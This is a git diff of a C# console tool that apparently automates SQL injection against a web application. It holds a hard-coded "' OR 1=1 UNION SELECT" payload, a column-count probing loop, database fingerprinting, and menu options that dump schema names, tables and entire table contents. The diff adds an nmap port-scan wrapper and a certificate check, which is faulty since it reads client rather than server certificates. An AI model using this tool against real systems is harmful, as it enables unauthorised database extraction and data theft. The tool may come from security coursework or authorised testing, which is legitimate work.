@@ -1,13 +1,17 @@
 ﻿using System;
 using System.Net;
+using System.Diagnostics;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+using System.Text.RegularExpressions;
 
 namespace Vizsgalo
 {
     public class Scanner
     {
         private static string _unionStart = "'' OR 1=1 UNION SELECT ";
-        private static int _unionNumber; //it represents how many plus columns we need to write in the union selects
-        private static string _unionColumnsString = ""; //it represents the union columns (the default value is "" aka no extra column)
+        private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
+        private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
         private static string _db = "";
         private static string _dbVersion = "";
         
@@ -33,7 +37,7 @@ namespace Vizsgalo
 
         public static async Task Main()
         {
-            Console.WriteLine("Examination started");
+            Console.WriteLine("Examination started\n");
             
             //sends a GET request to the given url and writes the response to the console
             await GetAsync(_httpClient);
@@ -46,11 +50,7 @@ namespace Vizsgalo
         {
             // STEP 1: give the query string keys manually
             Console.WriteLine("Enter the query string parameters (separated with ; characters):");
-            string paramsString = Console.ReadLine();
-            if (paramsString == null)
-            {
-                paramsString = "";
-            }
+            string paramsString = Console.ReadLine() ?? "";
             string[] parameters = paramsString.Split(";");
             
             
@@ -62,6 +62,7 @@ namespace Vizsgalo
             {
                 _unionNumber++;
                 _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
+                Console.WriteLine();
                 Console.WriteLine(_unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                 Console.WriteLine("Checking for SQL Server or MySql first...");
                 
@@ -98,13 +99,13 @@ namespace Vizsgalo
                     else
                     {
                         _db = "mysql";
-                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB";
+                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB"; //TODO
                     }
                     // Console.WriteLine($"{jsonUnionResponse}\n");
                 }
             } while (unionResponse.StatusCode != HttpStatusCode.OK);
             
-            Console.WriteLine("Success, " + _db + " is used, database version: " + _dbVersion);
+            Console.WriteLine("\nSuccess, " + _db + " is used, database version: " + _dbVersion);
             Console.WriteLine("Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);
             
             
@@ -112,12 +113,18 @@ namespace Vizsgalo
             ConsoleKeyInfo key;
             do
             {
-                Console.WriteLine("Select an operation to execute:");
+                Console.WriteLine("\nSelect an operation to execute:");
+                Console.WriteLine("\nDATABASE OPERATIONS");
                 Console.WriteLine("> Press '1' to get all schema names in the current database");
                 Console.WriteLine("> Press '2' to get all table names in the given schema");
                 Console.WriteLine("> Press '3' to get the given table's schema");
                 Console.WriteLine("> Press '4' to get all data from the given database");
-                Console.WriteLine("> Press '0' to escape (finish) the examination");
+                
+                Console.WriteLine("\nNETWORK AND SERVER OPERATIONS");
+                Console.WriteLine("> Press '5' to scan the server for open ports");
+                Console.WriteLine("> Press '6' to check the validity of the server's certificate");
+                
+                Console.WriteLine("\n> Press '0' to escape (finish) the examination");
                 key = Console.ReadKey();
                 Console.WriteLine();
 
@@ -129,10 +136,10 @@ namespace Vizsgalo
                 } else if (key.Key == ConsoleKey.D2)
                 {
                     // STEP 3.2 (OPTION 2): get all table names in the given schema
-                    Console.WriteLine("\nType the name of the schema:");
-                    string schemaName = Console.ReadLine();
+                    Console.WriteLine("\nEnter the name of the schema:");
+                    string schemaName = Console.ReadLine() ?? "";
                     Console.WriteLine();
-                    if (schemaName != null)
+                    if (schemaName != "")
                     {
                         Console.WriteLine("\nAll tables in the given database:");
                         await GetTableNamesInSchema(httpClient, schemaName, parameters[0]);
@@ -140,10 +147,10 @@ namespace Vizsgalo
                 } else if (key.Key == ConsoleKey.D3)
                 {
                     // STEP 3.3 (OPTION 3): get the given table's schema
-                    Console.WriteLine("\nType the name of the table:");
-                    string tableName = Console.ReadLine();
+                    Console.WriteLine("\nEnter the name of the table:");
+                    string tableName = Console.ReadLine() ?? "";
                     Console.WriteLine();
-                    if (tableName != null)
+                    if (tableName != "")
                     {
                         Console.WriteLine("\nThe given table's schema:");
                         await GetTableSchema(httpClient, tableName, parameters[0]);
@@ -151,12 +158,52 @@ namespace Vizsgalo
                 } else if (key.Key == ConsoleKey.D4)
                 {
                     // STEP 3.4 (OPTION 4): get all data from the given database
-                    Console.WriteLine("\nType the name of the database:");
-                    string tableName = Console.ReadLine();
+                    Console.WriteLine("\nEnter the name of the database:");
+                    string tableName = Console.ReadLine() ?? "";
                     Console.WriteLine();
-                    if (tableName != null)
+                    if (tableName != "")
                     {
                         await GetAllDataFromTable(httpClient, tableName, parameters[0]);
+                    }
+                } else if (key.Key == ConsoleKey.D5)
+                {
+                    // STEP 3.5 (OPTION 5): scan the server for open ports
+                    Console.WriteLine("\nEnter the server's IP address:");
+                    string address = Console.ReadLine() ?? "";
+                    Console.WriteLine("\nEnter the nmap arguments:");
+                    string pars = Console.ReadLine() ?? "";
+                    string args = pars + " " + address;
+                    Console.WriteLine();
+                    if (args != " ")
+                    {
+                        Console.WriteLine("Scanning " + address + " with these parameters: " + pars);
+                        string result = ScanForOperPorts(httpClient, args);
+                        Console.WriteLine(result);
+                        Console.WriteLine("Number of open ports: " + Regex.Matches(result, "open").Count);
+                    }
+                    else
+                    {
+                        Console.WriteLine("Invalid parameters!");
+                    }
+                } else if (key.Key == ConsoleKey.D6)
+                {
+                    // STEP 3.6 (OPTION 6): check the validity of the server's certificate
+                    /*Console.WriteLine("\nEnter the server's address (URL):");
+                    string address = Console.ReadLine() ?? "localhost";
+                    Console.WriteLine("\nEnter the destination port:");
+                    string port = Console.ReadLine() ?? "5227";*/
+                    string address = httpClient.BaseAddress != null ? httpClient.BaseAddress.ToString() : "localhost";
+                    if (address.Contains("http"))
+                    {
+                        await CheckCertificateHttp(httpClient, address);
+                    } else if (address.Contains("https"))
+                    {
+                        await CheckCertificateHttps(httpClient, address);
+                    }
+                    else
+                    {
+                        string httpAddress = "http://" + address;
+                        await CheckCertificateHttp(httpClient, httpAddress);
                     }
                 }
             } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
@@ -254,6 +301,81 @@ namespace Vizsgalo
                 Console.WriteLine("Getting all data using SQLite...");
                 await SqliteGet(httpClient, url);
             }
+        }
+
+        static string ScanForOperPorts(HttpClient httpClient, string arguments)
+        {
+            Console.WriteLine("\nScanning in progress...");
+            string nmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";
+            string result;
+            
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = nmapPath;
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+
+                process.Start();
+
+                using (StreamReader reader = process.StandardOutput)
+                {
+                    result = reader.ReadToEnd();
+                }
+
+                process.WaitForExit();
+            }
+            
+            return result;
+        }
+
+        static async Task CheckCertificateHttp(HttpClient httpClient, string address)
+        {
+            try
+            {
+                using (HttpClientHandler handler = new HttpClientHandler())
+                {
+                    using (HttpClient client = new HttpClient(handler))
+                    {
+                        Console.WriteLine($"Checking {address} for any certificates...");
+                        HttpResponseMessage response = client.GetAsync(address).Result;
+
+                        if (response.IsSuccessStatusCode)
+                        {
+                            // Server certificate information can be accessed here
+                            var certificates = handler.ClientCertificates;
+
+                            if(certificates.Count == 0)
+                            {
+                                Console.WriteLine("\nThe server did not provide any certificates.");
+                            }
+                            else
+                            {
+                                Console.WriteLine("\nThe server provides these certificates:");
+                                for (int i = 0; i < certificates.Count; i++)
+                                {
+                                    Console.WriteLine($"\nCertificate #{i + 1}: {certificates[i]}");
+                                    string expirationDate = certificates[i].GetExpirationDateString();
+                                    Console.WriteLine($"Expiration date: {expirationDate}");
+                                }
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine($"HTTP request failed with status code: {response.StatusCode}");
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+        }
+        
+        static async Task CheckCertificateHttps(HttpClient httpClient, string address)
+        {
         }
         
         
